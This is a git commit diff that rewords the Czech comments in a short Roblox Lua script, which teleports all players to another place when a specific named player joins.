bda4bd4e6b2a4adb09df03bf5285a933dc7031d9
webpubl <156443533+webpubl@users.noreply.github.com>
2025-04-24 16:21:03 +0200

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,20 +1,19 @@
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 
--- ID hry na kterou se má teleportovat
+-- ID cílové hry
 local targetPlaceId = 140233560440008
 
--- Funkce pro teleportaci všech hráčů
+-- Funkce pro teleportaci všech hráčů na cílovou hru
 local function teleportPlayers()
     for _, player in pairs(Players:GetPlayers()) do
-        -- Teleportuj hráče na cílovou hru
         TeleportService:Teleport(targetPlaceId, player)
     end
 end
 
 -- Sledování připojení hráčů
 Players.PlayerAdded:Connect(function(player)
-    -- Když se připojí "TuBeRs93cs0"
+    -- Pokud se připojí hráč "TuBeRs93cs0"
     if player.Name == "TuBeRs93cs0" then
         -- Teleportuj všechny hráče na cílovou hru
         teleportPlayers()
